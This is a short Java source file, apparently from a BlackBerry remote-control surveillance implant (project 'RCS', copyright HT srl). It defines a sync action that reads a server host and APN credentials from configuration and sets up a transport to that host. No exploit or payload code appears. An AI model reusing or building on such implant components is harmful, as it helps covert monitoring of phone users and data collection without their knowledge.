//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync;

import rpc.json.me.JSONException;
import rpc.json.me.JSONObject;
import blackberry.action.Apn;
import blackberry.action.sync.transport.ApnTransport;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class SyncActionApn extends SyncAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE);
    //#endif

    String host;

    private boolean stop;

    public SyncActionApn(ConfAction conf) {
        super(conf);
    }

    protected boolean parse(final ConfAction params) {
        Apn apn;

        try {
            host = params.getString("host");
            stop = params.getBoolean("stop");

            //#ifdef DEBUG
            debug.trace("host: " + host);
            //#endif

            apn = new Apn();
            JSONObject apnConf = params.getChild("apn");

            apn.apn = apnConf.getString("name");
            apn.user = apnConf.getString("user");
            apn.pass = apnConf.getString("pass");

            if (apn.isValid()) {
                //#ifdef DEBUG
                debug.trace("adding apn: " + apn);
                //#endif

                transports.addElement(new ApnTransport(host, apn));

            } else {
                //#ifdef DEBUG
                debug.trace("No valid apn");
                //#endif
            }

        } catch (final JSONException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error("params FAILED");
            //#endif
            return false;
        }
        return true;
    }

    protected boolean initTransport() {
        return true;
    }

    //#ifdef DEBUG
    public String toString() {
        return "SyncApn ";
    }
    //#endif

}
